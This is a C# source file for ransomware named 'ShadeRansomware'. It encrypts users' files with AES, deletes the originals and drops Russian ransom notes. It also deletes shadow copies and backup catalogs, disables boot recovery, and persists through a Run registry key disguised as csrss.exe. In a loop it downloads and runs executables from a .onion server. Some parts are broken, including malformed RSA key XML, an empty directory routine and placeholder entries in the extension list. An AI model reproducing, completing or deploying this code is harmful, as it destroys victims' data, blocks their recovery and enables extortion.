using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ShadeRansomware;

internal class Program
{
	private static byte[] _aesKey;

	private static readonly string userDir = "C:\\Users\\";

	private static byte[] _aesIv;

	private static RSA _rsa;

	private static object _lock = new object();

	private static readonly string userName;

	private readonly string imageUrl = "http://127.0.0.1/image.bmp";

	private readonly string fileName = GenerateRandomFilename() + ".bmp";

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	public static string UserName => userName;

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteFile(IntPtr hFile, [MarshalAs(UnmanagedType.LPArray)] byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	private static void Main(string[] args)
	{
		_aesKey = new byte[32];
		_aesIv = new byte[16];
		using (RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create())
		{
			randomNumberGenerator.GetBytes(_aesKey);
			randomNumberGenerator.GetBytes(_aesIv);
		}
		using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048))
		{
			rSACryptoServiceProvider.FromXmlString("<RSAKeyValue>\r\n                      <Modulus>xJ6q0LYu91Pi9qAeIUF/3NskUgMESYobWh+Z4SMtC+NGKDmPkQ2saTFCNCxtJ5qYxDIUPzUcpVUDOqx1hL/eE4CYEQBHZbUQ30NnbfqmXDnOp2PEpLm4o9Qs6NNinfqngQ7+vs/DYJUCvZaUh5W4gaV0CswrHd3aOWjcmCBx27MKgDSlVjhKPUd/4YkL0i1nH8JBxDfThVZ7a9KJZX96ttrofl17TObhqyT5ScwXC426nbrlAEHXcJiI9CnBEHcynpIeSseQaJYT/W0o7BRej/eqc4ZNWbOQOgvathyguTrtjPyMMYQD7wo1OFJX8c5K2rbl8/Qd2c7KJQDGSE+AjQ==</Modulus><Exponent>AQAB</Modulus>\r\n                      <Exponent>...</Exponent>\r\n                    </RSAKeyValue>");
			_rsa = rSACryptoServiceProvider;
		}
		string[] extensions = new string[146]
		{
			".1cd", ".3ds", ".3fr", ".3g2", ".3gp", ".7z", ".accda", ".accdb", ".accdc", ".accde",
			".accdr", ".accdt", ".act", ".adb", ".adp", ".ads", ".adts", ".afm", ".agdl", ".ai",
			".aif", ".aifc", ".aiff", ".ait", ".alz", ".amr", ".ani", ".apj", ".app", ".apr",
			".arc", ".arj", ".art", ".asc", ".asf", ".asm", ".asp", ".ass", ".asti", ".asx",
			".au", ".avi", ".awg", ".bak", ".baml", ".bash", ".bat", ".bdf", ".bdm", ".bdt",
			".bem", ".bib", ".bik", ".bin", ".bkf", ".bkp", ".bld", ".blg", ".bmp", ".bpg",
			".bpk", ".bpm", ".box", ".boz", ".bpa", ".bpc", ".bpd", ".bpe", ".bpg", ".bph",
			".bpk", ".bpm", ".bpr", ".bpt", ".bpw", ".brk", ".brs", ".bsa", ".bsd", ".bsl",
			".bss", ".bst", ".bsv", ".btm", ".bts", ".bup", ".bz2", ".c", ".cab", ".cac",
			".caf", ".cam", ".car", ".cat", ".cbr", ".cbt", ".cbz", ".cc", ".ccad", ".ccc",
			".txt", ".cch", ".cch", ".ccr", ".ccs", ".cct", ".ccw", ".cd", ".cd3", ".cdf",
			".cdi", ".cdr", ".cdt", ".cdr", ".cer", ".cfg", ".cfm", ".cgm", ".cha", ".chm",
			".chs", ".cht", ".cid", ".cin", ".cip", ".cir", ".ck", ".cls", ".clw", ".cmd",
			".cml", ".cmp", ".cmx", ".cnk", ".cod", ".config", ".conf", ".con", ".cot", ".cpl",
			".log", "...", "...", "...", "...", "..."
		};
		string[] array = new string[13]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
			Environment.GetFolderPath(Environment.SpecialFolder.Personal).TrimEnd(new char[1] { '\\' }) + "\\Мои видеозаписи",
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos).TrimEnd(new char[1] { '\\' }) + "\\Мои видеозаписи",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive\\",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\3D Objects\\",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Links\\",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Saved Games\\",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\\\Searches\\",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\\\Favorites\\",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\\\\\Contacts\\",
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			if (!text.EndsWith("\\Мои рисунки") && !text.EndsWith("\\Моя музыка") && !text.EndsWith("\\Мои видеозаписи"))
			{
				EncryptFiles(text, extensions);
			}
		}
		CreateREADMEFiles();
		LookForDirectories();
		Obou(args);
		AddAutostartEntry();
		CopySelf();
		DeleteShadowCopies();
		ConnectToServer();
		LookForDirectories();
	}

	private static void EncryptFiles(string dir, string[] extensions)
	{
		string[] files = Directory.GetFiles(dir);
		foreach (string text in files)
		{
			if (!text.EndsWith(".shade"))
			{
				EncryptFile(text, extensions);
			}
		}
		string[] directories = Directory.GetDirectories(dir);
		foreach (string dir2 in directories)
		{
			EncryptFiles(dir2, extensions);
		}
	}

	private static void EncryptFile(string file, string[] extensions)
	{
		bool flag = false;
		foreach (string value in extensions)
		{
			if (file.EndsWith(value))
			{
				flag = true;
				break;
			}
		}
		if (!flag)
		{
			return;
		}
		lock (_lock)
		{
			byte[] array = File.ReadAllBytes(file);
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Key = _aesKey;
			aesCryptoServiceProvider.IV = _aesIv;
			ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor();
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			File.WriteAllBytes(file + ".shade", bytes);
			File.Delete(file);
		}
	}

	private static void CreateREADMEFiles()
	{
		for (int i = 1; i <= 10; i++)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"README{i}.txt");
			File.WriteAllText(path, "Ваши файлы были зашифрованы...");
		}
	}

	private static void CopySelf()
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Drivers");
		Directory.CreateDirectory(text);
		File.Copy(Environment.GetCommandLineArgs()[0], Path.Combine(text, Path.GetFileName(Environment.GetCommandLineArgs()[0])));
	}

	private static object ConnectToServer()
	{
		while (true)
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile("gxyvmhc55s4fss2q.onion/reg***", "Reg***.exe");
				webClient.DownloadFile("gxyvmhc55s4fss2q.onion/prog***", "Prog***.exe");
				webClient.DownloadFile("gxyvmhc55s4fss2q.onion/err***", "Err***.exe");
				webClient.DownloadFile("gxyvmhc55s4fss2q.onion/cmd***", "Cmd***.exe");
				webClient.DownloadFile("gxyvmhc55s4fss2q.onion/sys**", "Sys**1.exe");
				Thread.Sleep(1000);
				Process.Start("Reg***.exe");
				Thread.Sleep(1000);
			}
			catch
			{
			}
		}
	}

	private static void LookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				EncryptDirectory(driveInfo.ToString());
			}
		}
		string v = userDir + UserName + "\\Links";
		string v2 = userDir + UserName + "\\Contacts";
		_ = userDir + userName + "\\Documents";
		string v3 = userDir + UserName + "\\Downloads";
		string v4 = userDir + UserName + "\\Pictures";
		string v5 = userDir + UserName + "\\Music";
		string v6 = userDir + UserName + "\\OneDrive";
		string v7 = userDir + UserName + "\\Saved Games";
		string v8 = userDir + UserName + "\\Favorites";
		string v9 = userDir + UserName + "\\Searches";
		string v10 = userDir + UserName + "\\Videos";
		EncryptDirectory(v);
		EncryptDirectory(v2);
		EncryptDirectory(v3);
		EncryptDirectory(v4);
		EncryptDirectory(v5);
		EncryptDirectory(v6);
		EncryptDirectory(v7);
		EncryptDirectory(v8);
		EncryptDirectory(v9);
		EncryptDirectory(v10);
	}

	private static void EncryptDirectory(string v)
	{
	}

	private static void RunCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void DeleteShadowCopies()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
		processStartInfo.Verb = "runas";
		processStartInfo.UseShellExecute = false;
		processStartInfo.RedirectStandardInput = true;
		Process process = Process.Start(processStartInfo);
		if (process == null)
		{
			Console.WriteLine("Не удалось открыть командную строку от имени администратора.");
			return;
		}
		process.StandardInput.WriteLine("vssadmin delete shadows /all /quiet");
		process.StandardInput.WriteLine("wmic shadowcopy delete");
		process.StandardInput.WriteLine("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		process.StandardInput.WriteLine("bcdedit /set {default} recoveryenabled no");
		process.StandardInput.WriteLine("wbadmin delete catalog -quiet");
		process.WaitForExit();
		process.Close();
	}

	private static void AddAutostartEntry()
	{
		string value = "C:\\ProgramData\\Drivers\\csrss.exe";
		using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string text = GenerateRandomFilename() + ".bmp";
		registryKey.SetValue("Client Server Runtime Subsystem", value);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public static void SetWallpaper(string bmpFilePath)
	{
		SystemParametersInfo(20, 0, bmpFilePath, 3);
	}

	public static string getRandomFileName()
	{
		string text = "";
		string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
		Random random = new Random();
		int location = random.Next(4, 10);
		while (Math.Max(Interlocked.Decrement(ref location), checked(location + 1)) > 0)
		{
			text += Conversions.ToString(text2[random.Next(text2.Length)]);
		}
		return text;
	}

	public static void ManageWallpaper(string bmpUrl, string fileName)
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Roaming\\";
		string text = Path.Combine(path, fileName);
		try
		{
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile(bmpUrl, text);
			}
			SetWallpaper(text);
			File.Delete(text);
		}
		catch (Exception ex)
		{
			Console.WriteLine("I cant realize that :( " + ex.Message);
		}
	}

	public static string GenerateRandomFilename()
	{
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < 10; i++)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static void Obou(string[] args)
	{
		if (args.Length < 1)
		{
			Console.WriteLine("Usage: WallpaperManager <bmp url>");
			return;
		}
		string bmpUrl = args[0];
		string text = GenerateRandomFilename() + ".bmp";
		ManageWallpaper(bmpUrl, text);
	}
}
